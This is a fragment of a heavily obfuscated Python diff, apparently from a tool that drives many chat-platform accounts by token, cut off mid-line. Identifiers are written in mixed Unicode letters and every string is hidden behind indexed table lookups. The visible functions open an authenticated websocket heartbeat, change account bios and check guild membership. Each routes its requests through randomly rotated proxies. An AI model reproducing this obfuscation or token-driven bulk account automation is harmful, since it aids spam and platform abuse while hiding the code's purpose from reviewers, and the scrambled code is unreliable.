𝙄𝗡𝗜𝗡𝙡𝙡𝙄𝗠𝘐𝗜𝗹𝗠𝘭𝗹𝙄𝘭𝙡𝗡𝘕𝘐𝗹𝘭𝗠𝙉𝗹𝘕𝘭𝙈𝘐𝗠𝗜𝙈[117]: 𝗜𝘕𝘐𝗡𝙡𝙡𝙄𝙈𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝘭𝗹𝙉𝙉𝗜𝘭𝘭𝘔𝙉𝘭𝘕𝗹𝗠𝗜𝘔𝗜𝗠[290]}, 𝗜𝘕𝘐𝘕𝘭𝗹𝘐𝗠𝙄𝗜𝘭𝙈𝗹𝙡𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝘔𝗡𝗹𝗡𝘭𝗠𝙄𝗠𝗜𝗠[276]: {𝘐𝗡𝗜𝗡𝘭𝗹𝙄𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝗜𝘭𝗹𝗡𝗡𝗜𝗹𝙡𝘔𝘕𝘭𝗡𝙡𝙈𝙄𝘔𝗜𝗠[291]: 𝘳𝗮𝘯𝙙𝗼𝗺.choice(𝘴𝙩𝙖𝙩𝘂𝙨), 𝗜𝘕𝗜𝘕𝘭𝘭𝙄𝙈𝙄𝗜𝙡𝗠𝗹𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝘭𝙡𝘔𝙉𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝗠[292]: 0, 𝙄𝙉𝗜𝘕𝘭𝗹𝙄𝘔𝘐𝘐𝙡𝙈𝙡𝗹𝗜𝗹𝙡𝗡𝗡𝗜𝙡𝘭𝘔𝘕𝘭𝗡𝘭𝙈𝘐𝙈𝙄𝘔[293]: [], 𝙄𝘕𝙄𝙉𝘭𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝗹𝙡𝙄𝙡𝙡𝘕𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝙉𝙡𝘔𝗜𝙈𝗜𝗠[294]: False}, 𝘐𝘕𝗜𝗡𝙡𝙡𝙄𝘔𝘐𝗜𝘭𝙈𝘭𝘭𝗜𝙡𝗹𝙉𝗡𝘐𝗹𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝙄𝗠𝘐𝗠[277]: False, 𝙄𝙉𝙄𝗡𝘭𝘭𝘐𝙈𝙄𝗜𝙡𝙈𝘭𝘭𝙄𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝙉𝗹𝙉𝘭𝘔𝗜𝘔𝗜𝙈[278]: {𝙄𝘕𝗜𝙉𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝗠𝘭𝙡𝘐𝙡𝘭𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝙈𝘐𝘔[295]: {}, 𝗜𝗡𝘐𝙉𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝙈𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝘭𝗹𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝗜𝘔[296]: 𝙄𝙉𝗜𝗡𝗹𝗹𝘐𝗠𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝗹𝙡𝙉𝙉𝘐𝙡𝙡𝗠𝙉𝗹𝘕𝗹𝙈𝘐𝗠𝙄𝘔[231], 𝗜𝗡𝗜𝗡𝗹𝗹𝘐𝘔𝘐𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝙡𝗡𝙉𝗜𝗹𝘭𝙈𝘕𝘭𝗡𝙡𝙈𝗜𝘔𝙄𝙈[297]: 0, 𝙄𝘕𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝙄𝗹𝙈𝙡𝗹𝘐𝗹𝗹𝗡𝙉𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[298]: -1}}}
+    𝘸𝘴.send(𝘫𝘴𝘰𝙣.dumps(𝗮𝙪𝙩𝘩))
     while True:
-        𝙝𝙚𝗮𝙧𝘵𝘣𝘦𝗮𝘵𝘑𝗦𝘖𝗡 = {𝘕𝗠𝙈𝘔𝙉𝙡𝗹𝗠𝗠𝗹𝘔𝘔𝘕𝙡𝙄𝗠𝙄𝙄𝙉𝗠𝗜𝙄𝙈𝗜𝗹𝗜𝗡𝘐𝘔𝙄𝘐𝙈[176]: 1, 𝗡𝘔𝙈𝗠𝙉𝘭𝙡𝗠𝘔𝗹𝗠𝘔𝙉𝗹𝗜𝘔𝘐𝘐𝙉𝘔𝘐𝙄𝗠𝗜𝗹𝘐𝗡𝘐𝘔𝙄𝙄𝙈[260]: 𝙩𝙤𝘬𝗲𝘯, 𝗡𝙈𝘔𝘔𝙉𝙡𝙡𝙈𝘔𝗹𝗠𝘔𝘕𝙡𝗜𝗠𝗜𝙄𝗡𝗠𝘐𝙄𝘔𝘐𝙡𝗜𝙉𝙄𝗠𝘐𝙄𝗠[173]: 𝗡𝘔𝙈𝙈𝗡𝘭𝗹𝗠𝗠𝘭𝙈𝘔𝙉𝗹𝙄𝗠𝘐𝙄𝘕𝗠𝗜𝗜𝙈𝙄𝘭𝗜𝗡𝙄𝘔𝘐𝙄𝘔[297]}
-        𝘄𝘴.send(𝗷𝘴𝗼𝙣.dumps(𝗵𝗲𝙖𝘳𝘁𝙗𝘦𝘢𝙩𝘑𝙎𝘖𝙉))
-        𝘀𝗹𝗲𝙚𝘱(𝗵𝘦𝘢𝘳𝙩𝘣𝙚𝘢𝘵_𝙞𝙣𝙩𝙚𝙧𝘃𝘢𝙡)
+        𝙝𝙚𝙖𝗿𝘁𝙗𝘦𝗮𝘁𝘑𝘚𝙊𝘕 = {𝘐𝙉𝘐𝗡𝘭𝗹𝙄𝘔𝙄𝗜𝗹𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝘕𝗜𝙡𝙡𝗠𝙉𝗹𝗡𝙡𝙈𝙄𝙈𝗜𝗠[169]: 1, 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝘐𝘭𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝗡𝙡𝙉𝘭𝘔𝘐𝗠𝘐𝙈[253]: 𝙩𝗼𝘬𝙚𝙣, 𝘐𝙉𝙄𝙉𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝗜𝙡𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝙈[166]: 𝙄𝘕𝙄𝙉𝘭𝗹𝙄𝙈𝙄𝘐𝗹𝘔𝙡𝙡𝙄𝙡𝘭𝗡𝙉𝙄𝙡𝗹𝙈𝘕𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝘔[290]}
+        𝘄𝘴.send(𝙟𝘴𝘰𝙣.dumps(𝘩𝘦𝘢𝘳𝘁𝙗𝘦𝘢𝙩𝘑𝙎𝘖𝘕))
+        𝘴𝘭𝗲𝙚𝘱(𝙝𝙚𝙖𝗿𝘵𝗯𝘦𝘢𝘵_𝙞𝘯𝙩𝘦𝗿𝘃𝙖𝙡)
 
 def bio_changer(token, bio):
-    𝙝𝙚𝙖𝘥𝗲𝗿𝘴 = 𝘏𝗲𝙖𝙙𝗲𝙧𝘴(𝙩𝗼𝗸𝘦𝙣)
-    𝙥𝗮𝙮𝘭𝘰𝘢𝗱 = {𝗡𝗠𝙈𝗠𝙉𝙡𝘭𝗠𝙈𝘭𝗠𝘔𝗡𝗹𝙄𝙈𝙄𝘐𝘕𝙈𝘐𝘐𝙈𝙄𝗹𝗜𝙉𝙄𝙈𝘐𝗜𝗠[306]: 𝗯𝙞𝙤}
-    𝘥𝘯 = 𝘵𝗼𝙠𝘦𝙣.split(𝗡𝗠𝘔𝗠𝗡𝘭𝙡𝗠𝘔𝗹𝗠𝙈𝙉𝗹𝗜𝘔𝙄𝙄𝗡𝗠𝗜𝗜𝙈𝗜𝗹𝙄𝙉𝙄𝗠𝗜𝗜𝙈[254])
-    𝗻𝗻 = 𝘥𝗻[0]
-    if 𝘱𝗿𝘰𝘹𝙮:
-        𝗿𝘳 = 𝗿𝙚𝗾𝙪𝘦𝘀𝘁𝘴.patch(𝗡𝗠𝙈𝙈𝘕𝘭𝙡𝗠𝙈𝙡𝙈𝙈𝗡𝗹𝙄𝙈𝗜𝘐𝘕𝗠𝗜𝗜𝗠𝙄𝙡𝘐𝗡𝘐𝗠𝘐𝙄𝗠[307], headers=𝘩𝘦𝘢𝙙𝘦𝗿𝙨, json=𝗽𝗮𝙮𝙡𝘰𝙖𝙙, proxy={𝗡𝙈𝘔𝘔𝙉𝙡𝘭𝙈𝙈𝗹𝗠𝗠𝗡𝘭𝙄𝗠𝗜𝗜𝙉𝙈𝙄𝘐𝙈𝗜𝘭𝗜𝙉𝙄𝘔𝙄𝘐𝙈[251]: 𝙉𝙈𝗠𝘔𝗡𝙡𝙡𝗠𝙈𝗹𝗠𝘔𝘕𝘭𝗜𝘔𝘐𝙄𝗡𝙈𝙄𝘐𝙈𝗜𝗹𝘐𝘕𝙄𝗠𝘐𝘐𝙈[253] + 𝙧𝗮𝗻𝗱𝙤𝗺.choice(𝙥𝘳𝘰𝘹𝘪𝗲𝘴), 𝘕𝘔𝘔𝙈𝗡𝘭𝙡𝙈𝙈𝙡𝘔𝗠𝗡𝗹𝗜𝙈𝙄𝘐𝘕𝘔𝘐𝙄𝙈𝗜𝘭𝘐𝗡𝗜𝘔𝗜𝗜𝗠[252]: 𝙉𝙈𝙈𝘔𝗡𝗹𝗹𝙈𝘔𝗹𝙈𝙈𝙉𝗹𝙄𝙈𝗜𝙄𝙉𝘔𝗜𝘐𝙈𝗜𝗹𝙄𝗡𝘐𝘔𝙄𝙄𝘔[253] + 𝗿𝘢𝙣𝗱𝙤𝘮.choice(𝙥𝘳𝘰𝙭𝙞𝘦𝘴)})
+    𝘩𝙚𝘢𝘥𝘦𝗿𝘴 = 𝘏𝘦𝙖𝙙𝙚𝗿𝙨(𝘵𝗼𝘬𝙚𝗻)
+    𝗽𝗮𝙮𝗹𝙤𝘢𝗱 = {𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝘔𝙄𝗜𝙡𝘔𝘭𝗹𝙄𝗹𝗹𝗡𝗡𝙄𝗹𝘭𝘔𝗡𝘭𝘕𝗹𝗠𝘐𝙈𝘐𝘔[299]: 𝙗𝗶𝗼}
+    𝘥𝙣 = 𝘵𝗼𝘬𝗲𝗻.split(𝙄𝘕𝘐𝗡𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝗠𝗹𝗹𝙄𝗹𝗹𝗡𝗡𝙄𝙡𝙡𝙈𝘕𝘭𝘕𝘭𝙈𝘐𝙈𝘐𝗠[247])
+    𝘯𝗻 = 𝙙𝗻[0]
+    if 𝘱𝙧𝘰𝘅𝘺:
+        𝙧𝗿 = 𝙧𝗲𝙦𝘂𝙚𝙨𝘵𝙨.patch(𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝘭𝗠𝗡𝙡𝗡𝙡𝙈𝙄𝘔𝘐𝘔[300], headers=𝗵𝙚𝗮𝗱𝙚𝙧𝘀, json=𝗽𝘢𝘺𝘭𝗼𝘢𝙙, proxy={𝗜𝙉𝗜𝙉𝘭𝙡𝘐𝘔𝗜𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝘭𝗡𝘕𝙄𝘭𝗹𝙈𝘕𝘭𝘕𝘭𝘔𝘐𝗠𝘐𝗠[244]: 𝗜𝙉𝙄𝙉𝘭𝗹𝗜𝙈𝗜𝘐𝘭𝙈𝙡𝗹𝘐𝗹𝘭𝘕𝙉𝗜𝘭𝙡𝙈𝗡𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝙈[246] + 𝗿𝙖𝙣𝘥𝘰𝗺.choice(𝘱𝗿𝘰𝙭𝙞𝙚𝙨), 𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝗠𝗜𝗜𝙡𝗠𝗹𝗹𝘐𝙡𝘭𝗡𝙉𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝘭𝘔𝙄𝙈𝘐𝗠[245]: 𝘐𝙉𝘐𝘕𝘭𝘭𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝗹𝗜𝗹𝙡𝗡𝙉𝗜𝘭𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝙈𝘐𝙈[246] + 𝘳𝗮𝗻𝗱𝗼𝗺.choice(𝙥𝙧𝗼𝘅𝗶𝙚𝘀)})
     else:
-        𝗿𝘳 = 𝘳𝙚𝗾𝘂𝘦𝘀𝘁𝘴.patch(𝘕𝙈𝙈𝗠𝘕𝙡𝙡𝘔𝘔𝘭𝙈𝗠𝙉𝙡𝘐𝘔𝙄𝘐𝘕𝙈𝘐𝘐𝗠𝗜𝗹𝙄𝙉𝘐𝘔𝘐𝗜𝘔[307], headers=𝙝𝘦𝘢𝙙𝙚𝘳𝘀, json=𝗽𝘢𝙮𝙡𝘰𝗮𝙙)
-    if 𝘳𝙧.status_code == 200:
-        𝗽𝙧𝗶𝗻𝘁(f"{𝘳}{𝙉𝗠𝗠𝘔𝗡𝘭𝘭𝗠𝘔𝙡𝗠𝘔𝙉𝗹𝙄𝙈𝘐𝘐𝗡𝘔𝗜𝘐𝙈𝗜𝘭𝗜𝙉𝙄𝗠𝗜𝗜𝙈[98]}{𝗱𝙖𝙩𝗲𝙩𝙞𝙢𝘦.datetime.now().strftime(f'{𝗴}{𝘕𝘔𝗠𝗠𝘕𝗹𝘭𝗠𝘔𝗹𝙈𝘔𝘕𝙡𝗜𝘔𝗜𝘐𝗡𝘔𝘐𝙄𝗠𝙄𝘭𝘐𝗡𝙄𝗠𝘐𝙄𝘔[99]}{𝙧}')}{𝗡𝙈𝗠𝘔𝗡𝘭𝗹𝘔𝗠𝙡𝙈𝙈𝗡𝘭𝘐𝗠𝙄𝙄𝘕𝗠𝘐𝙄𝙈𝙄𝘭𝘐𝙉𝙄𝙈𝘐𝗜𝗠[100]}{𝙧}{𝘕𝘔𝙈𝘔𝗡𝙡𝘭𝘔𝘔𝘭𝙈𝙈𝙉𝘭𝙄𝙈𝙄𝙄𝗡𝙈𝙄𝙄𝙈𝙄𝘭𝘐𝙉𝘐𝗠𝗜𝗜𝘔[98]}{𝙡𝗰}{𝘕𝙈𝗠𝙈𝘕𝘭𝗹𝙈𝗠𝗹𝗠𝗠𝘕𝗹𝙄𝙈𝗜𝗜𝗡𝗠𝙄𝙄𝘔𝗜𝘭𝗜𝘕𝙄𝗠𝘐𝙄𝗠[308]}{𝙧}{𝗡𝘔𝗠𝗠𝙉𝗹𝗹𝘔𝘔𝗹𝗠𝙈𝗡𝙡𝙄𝘔𝙄𝘐𝙉𝗠𝙄𝗜𝗠𝘐𝗹𝗜𝘕𝙄𝙈𝗜𝗜𝗠[100]}{𝗻𝗻}{𝗴}{𝘕𝙈𝗠𝙈𝙉𝘭𝙡𝘔𝙈𝙡𝘔𝘔𝗡𝗹𝙄𝙈𝘐𝙄𝘕𝘔𝗜𝗜𝘔𝙄𝗹𝗜𝘕𝘐𝗠𝙄𝘐𝗠[256]}")
+        𝘳𝙧 = 𝗿𝙚𝙦𝘶𝗲𝘴𝘵𝘴.patch(𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝗹𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝗹𝘔𝘕𝘭𝘕𝘭𝗠𝙄𝘔𝗜𝘔[300], headers=𝗵𝗲𝙖𝗱𝘦𝘳𝙨, json=𝘱𝙖𝙮𝘭𝘰𝘢𝙙)
+    if 𝘳𝘳.status_code == 200:
+        𝙥𝙧𝗶𝙣𝘁(f"{𝙧}{𝘐𝙉𝗜𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝘔𝘭𝙡𝗜𝘭𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝗠𝘐𝗠𝗜𝙈[91]}{𝗱𝗮𝘵𝘦𝘵𝗶𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝗜𝗡𝗜𝙉𝗹𝙡𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝙄𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝘔𝘕𝘭𝗡𝘭𝗠𝙄𝘔𝙄𝗠[92]}{𝘳}')}{𝗜𝗡𝗜𝙉𝗹𝙡𝘐𝗠𝙄𝘐𝗹𝘔𝙡𝘭𝗜𝗹𝙡𝙉𝗡𝙄𝙡𝘭𝙈𝗡𝗹𝗡𝗹𝘔𝘐𝗠𝘐𝗠[93]}{𝘳}{𝙄𝗡𝘐𝙉𝙡𝘭𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝗹𝙄𝘭𝘭𝙉𝗡𝙄𝙡𝙡𝘔𝗡𝙡𝗡𝗹𝙈𝙄𝙈𝗜𝙈[91]}{𝗹𝗰}{𝗜𝗡𝗜𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝙡𝘔𝘭𝗹𝗜𝗹𝙡𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝘭𝘕𝘭𝙈𝘐𝘔𝗜𝘔[301]}{𝘳}{𝘐𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝗠𝗹𝙡𝘐𝗹𝗹𝗡𝙉𝙄𝘭𝗹𝘔𝙉𝗹𝙉𝘭𝗠𝙄𝗠𝘐𝘔[93]}{𝘯𝘯}{𝘨}{𝘐𝗡𝗜𝗡𝙡𝗹𝗜𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝘭𝘭𝗡𝙉𝗜𝗹𝘭𝙈𝗡𝘭𝗡𝘭𝗠𝙄𝗠𝗜𝗠[249]}")
     else:
-        𝙥𝙧𝗶𝙣𝘁(f"{𝗿}{𝘕𝗠𝙈𝗠𝙉𝘭𝘭𝗠𝘔𝗹𝗠𝘔𝗡𝘭𝙄𝙈𝙄𝙄𝗡𝗠𝙄𝙄𝙈𝙄𝗹𝘐𝘕𝗜𝙈𝙄𝗜𝙈[98]}{𝙙𝙖𝙩𝙚𝘵𝗶𝙢𝗲.datetime.now().strftime(f'{𝘨}{𝙉𝘔𝘔𝙈𝗡𝘭𝘭𝘔𝗠𝙡𝗠𝙈𝘕𝙡𝙄𝘔𝗜𝙄𝘕𝗠𝗜𝗜𝗠𝙄𝗹𝗜𝗡𝙄𝘔𝗜𝙄𝗠[99]}{𝙧}')}{𝘕𝘔𝙈𝘔𝙉𝘭𝗹𝙈𝙈𝘭𝗠𝗠𝘕𝙡𝙄𝘔𝘐𝙄𝘕𝘔𝘐𝙄𝘔𝘐𝙡𝗜𝘕𝘐𝗠𝗜𝙄𝘔[100]}{𝗿}{𝙉𝘔𝘔𝘔𝙉𝗹𝗹𝙈𝗠𝙡𝙈𝙈𝘕𝗹𝘐𝗠𝘐𝗜𝙉𝘔𝗜𝗜𝗠𝘐𝗹𝘐𝘕𝙄𝗠𝘐𝘐𝙈[98]}{𝙗}{𝘕𝘔𝗠𝙈𝙉𝘭𝙡𝙈𝘔𝙡𝙈𝗠𝙉𝙡𝗜𝘔𝗜𝙄𝙉𝘔𝘐𝘐𝙈𝗜𝙡𝙄𝙉𝙄𝗠𝙄𝙄𝘔[276]}{𝙧}{𝗡𝘔𝙈𝘔𝗡𝗹𝙡𝙈𝗠𝙡𝗠𝗠𝗡𝙡𝘐𝗠𝙄𝗜𝘕𝗠𝙄𝗜𝙈𝗜𝙡𝙄𝗡𝗜𝙈𝘐𝙄𝗠[100]}{𝘯𝙣}{𝙜}{𝘕𝘔𝘔𝗠𝗡𝙡𝙡𝘔𝗠𝘭𝘔𝘔𝗡𝘭𝙄𝘔𝗜𝙄𝗡𝗠𝙄𝙄𝗠𝙄𝙡𝗜𝗡𝘐𝙈𝘐𝙄𝙈[277]}{𝙧𝘳.text}")
+        𝘱𝘳𝘪𝘯𝙩(f"{𝘳}{𝗜𝘕𝗜𝗡𝗹𝗹𝘐𝗠𝗜𝘐𝘭𝘔𝙡𝙡𝗜𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝘔𝘕𝙡𝗡𝗹𝗠𝗜𝗠𝗜𝗠[91]}{𝗱𝘢𝘁𝗲𝘵𝗶𝗺𝘦.datetime.now().strftime(f'{𝗴}{𝗜𝘕𝘐𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝘔[92]}{𝘳}')}{𝘐𝘕𝗜𝗡𝘭𝙡𝙄𝙈𝗜𝗜𝙡𝙈𝘭𝘭𝙄𝘭𝙡𝙉𝘕𝘐𝘭𝗹𝗠𝘕𝗹𝙉𝙡𝗠𝙄𝙈𝙄𝘔[93]}{𝗿}{𝗜𝘕𝗜𝙉𝗹𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝗹𝘭𝗡𝘕𝗜𝙡𝙡𝙈𝙉𝙡𝗡𝗹𝘔𝙄𝘔𝘐𝗠[91]}{𝘣}{𝘐𝙉𝙄𝘕𝘭𝘭𝘐𝘔𝙄𝙄𝗹𝗠𝗹𝙡𝘐𝗹𝘭𝗡𝙉𝘐𝘭𝗹𝗠𝗡𝗹𝙉𝘭𝙈𝙄𝙈𝘐𝙈[269]}{𝗿}{𝗜𝙉𝙄𝘕𝘭𝗹𝙄𝗠𝘐𝙄𝘭𝙈𝘭𝗹𝗜𝗹𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝙉𝘭𝘕𝘭𝙈𝘐𝘔𝘐𝙈[93]}{𝙣𝘯}{𝙜}{𝙄𝗡𝗜𝙉𝙡𝗹𝘐𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝗜𝙡𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝗹𝘔𝙄𝙈𝙄𝙈[270]}{𝗿𝙧.text}")
 
 def check_guild(token, guildid):
     try:
-        𝙝𝗲𝗮𝙙𝗲𝗿𝘀 = {𝗡𝗠𝙈𝘔𝗡𝗹𝙡𝘔𝘔𝘭𝘔𝗠𝗡𝗹𝗜𝘔𝗜𝘐𝘕𝙈𝙄𝙄𝗠𝙄𝘭𝘐𝙉𝗜𝗠𝙄𝘐𝗠[137]: 𝙩𝘰𝘬𝘦𝗻}
-        if 𝗽𝗿𝙤𝙭𝙮:
-            𝙧𝙚𝙨𝙥𝘰𝘯𝘴𝘦 = 𝗿𝘦𝘲𝘂𝙚𝘴𝘁𝘀.get(f'{𝘕𝗠𝘔𝗠𝗡𝙡𝗹𝗠𝙈𝙡𝗠𝗠𝘕𝘭𝗜𝙈𝘐𝘐𝙉𝘔𝙄𝙄𝘔𝙄𝗹𝘐𝙉𝗜𝙈𝘐𝗜𝗠[159]}{𝙜𝙪𝘪𝗹𝙙𝘪𝘥}', headers=𝘩𝗲𝗮𝘥𝗲𝗿𝘴, proxy={𝗡𝙈𝗠𝘔𝗡𝘭𝙡𝘔𝗠𝘭𝙈𝘔𝘕𝗹𝗜𝘔𝙄𝘐𝙉𝘔𝘐𝙄𝘔𝘐𝘭𝗜𝙉𝗜𝘔𝘐𝙄𝘔[251]: 𝗡𝘔𝗠𝘔𝘕𝙡𝘭𝗠𝘔𝙡𝗠𝗠𝙉𝗹𝘐𝗠𝗜𝗜𝙉𝗠𝘐𝙄𝗠𝗜𝙡𝙄𝙉𝗜𝘔𝘐𝙄𝙈[253] + 𝘳𝗮𝙣𝗱𝗼𝘮.choice(𝗽𝙧𝗼𝘅𝙞𝘦𝘀), 𝘕𝘔𝗠𝗠𝘕𝘭𝙡𝗠𝙈𝘭𝘔𝗠𝙉𝙡𝙄𝘔𝗜𝘐𝘕𝗠𝘐𝗜𝙈𝙄𝗹𝘐𝗡𝗜𝗠𝘐𝗜𝗠[252]: 𝗡𝙈𝗠𝙈𝗡𝙡𝗹𝙈𝗠𝘭𝘔𝗠𝘕𝗹𝘐𝗠𝘐𝗜𝙉𝘔𝙄𝗜𝗠𝙄𝙡𝗜𝗡𝙄𝗠𝙄𝗜𝘔[253] + 𝙧𝘢𝗻𝘥𝗼𝗺.choice(𝗽𝘳𝗼𝘹𝘪𝘦𝘴)})
+        𝙝𝙚𝙖𝘥𝗲𝗿𝘴 = {𝘐𝗡𝘐𝙉𝗹𝘭𝗜𝙈𝘐𝗜𝗹𝙈𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝘕𝘭𝗠𝗜𝘔𝘐𝘔[130]: 𝘵𝗼𝘬𝘦𝙣}
+        if 𝙥𝙧𝗼𝘹𝙮:
+            𝗿𝗲𝙨𝙥𝗼𝙣𝘀𝘦 = 𝗿𝗲𝘲𝘂𝗲𝘀𝙩𝘀.get(f'{𝙄𝙉𝙄𝘕𝘭𝗹𝙄𝘔𝘐𝘐𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝗜𝙡𝙡𝗠𝘕𝘭𝙉𝘭𝘔𝗜𝗠𝗜𝙈[152]}{𝘨𝘶𝙞𝙡𝘥𝘪𝙙}', headers=𝘩𝙚𝗮𝘥𝗲𝙧𝙨, proxy={𝘐𝘕𝘐𝗡𝙡𝗹𝗜𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝙉𝙄𝘭𝗹𝘔𝗡𝙡𝗡𝗹𝗠𝙄𝙈𝙄𝙈[244]: 𝗜𝗡𝘐𝙉𝙡𝗹𝙄𝘔𝘐𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝙉𝗡𝙄𝙡𝘭𝘔𝗡𝘭𝗡𝗹𝗠𝙄𝙈𝗜𝙈[246] + 𝗿𝘢𝗻𝙙𝗼𝘮.choice(𝗽𝙧𝗼𝘅𝘪𝗲𝘴), 𝘐𝘕𝙄𝙉𝙡𝙡𝘐𝘔𝗜𝙄𝗹𝙈𝘭𝙡𝗜𝗹𝘭𝙉𝙉𝘐𝗹𝘭𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝗠𝙄𝗠[245]: 𝙄𝙉𝗜𝘕𝗹𝘭𝗜𝙈𝙄𝘐𝙡𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝙉𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝙄𝙈[246] + 𝙧𝙖𝘯𝙙𝗼𝙢.choice(𝙥𝙧𝘰𝙭𝘪𝙚𝘀)})
         else:
-            𝘳𝘦𝙨𝗽𝘰𝘯𝙨𝙚 = 𝙧𝘦𝗾𝙪𝘦𝘴𝙩𝘴.get(f'{𝙉𝙈𝘔𝗠𝗡𝗹𝙡𝙈𝘔𝗹𝘔𝙈𝙉𝙡𝙄𝗠𝙄𝗜𝘕𝘔𝙄𝘐𝘔𝙄𝘭𝗜𝙉𝙄𝙈𝘐𝗜𝘔[159]}{𝗴𝙪𝗶𝗹𝘥𝙞𝙙}', headers=𝗵𝗲𝘢𝙙𝗲𝘳𝘀)
-        𝙙𝙣 = 𝘵𝙤𝙠𝗲𝘯.split(𝙉𝙈𝗠𝗠𝙉𝘭𝘭𝘔𝙈𝗹𝙈𝘔𝙉𝗹𝗜𝘔𝙄𝗜𝙉𝗠𝘐𝙄𝗠𝗜𝙡𝘐𝘕𝗜𝗠𝘐𝙄𝙈[254])
-        𝙣𝗻 = 𝗱𝘯[0]
-        if 𝘳𝘦𝙨𝘱𝙤𝘯𝙨𝗲.status_code == 200:
-            𝘱𝙧𝙞𝗻𝘵(f"{𝘳}{𝙉𝘔𝙈𝙈𝘕𝙡𝘭𝗠𝗠𝙡𝗠𝘔𝗡𝘭𝙄𝗠𝙄𝙄𝗡𝙈𝘐𝙄𝘔𝘐𝘭𝙄𝗡𝙄𝙈𝙄𝘐𝗠[98]}{𝙙𝗮𝙩𝗲𝙩𝗶𝗺𝗲.datetime.now().strftime(f'{𝗴}{𝗡𝗠𝗠𝗠𝙉𝘭𝘭𝙈𝗠𝗹𝘔𝙈𝗡𝘭𝘐𝗠𝗜𝙄𝙉𝗠𝘐𝗜𝙈𝗜𝗹𝗜𝘕𝙄𝗠𝙄𝘐𝘔[99]}{𝗿}')}{𝙉𝗠𝘔𝗠𝘕𝙡𝙡𝙈𝘔𝙡𝘔𝘔𝘕𝙡𝘐𝘔𝗜𝘐𝗡𝘔𝗜𝗜𝘔𝗜𝘭𝗜𝙉𝗜𝘔𝙄𝘐𝙈[100]}{𝘳}{𝙉𝗠𝘔𝗠𝗡𝙡𝘭𝘔𝘔𝘭𝗠𝗠𝘕𝗹𝘐𝘔𝙄𝘐𝙉𝗠𝘐𝗜𝘔𝗜𝙡𝙄𝗡𝗜𝙈𝗜𝘐𝙈[98]}{𝘭𝘤}{𝙉𝙈𝘔𝙈𝙉𝗹𝙡𝗠𝗠𝙡𝗠𝘔𝘕𝗹𝘐𝗠𝗜𝗜𝘕𝗠𝘐𝙄𝙈𝙄𝙡𝘐𝙉𝘐𝗠𝘐𝘐𝘔[308]}{𝙧}{𝙉𝙈𝙈𝙈𝘕𝘭𝗹𝙈𝗠𝗹𝗠𝘔𝗡𝙡𝗜𝙈𝙄𝗜𝘕𝘔𝘐𝙄𝙈𝘐𝙡𝘐𝗡𝗜𝗠𝙄𝗜𝗠[100]}{𝘯𝘯}{𝗴}{𝙉𝗠𝘔𝘔𝙉𝙡𝗹𝘔𝙈𝗹𝙈𝘔𝘕𝗹𝗜𝗠𝘐𝘐𝘕𝘔𝘐𝙄𝙈𝙄𝙡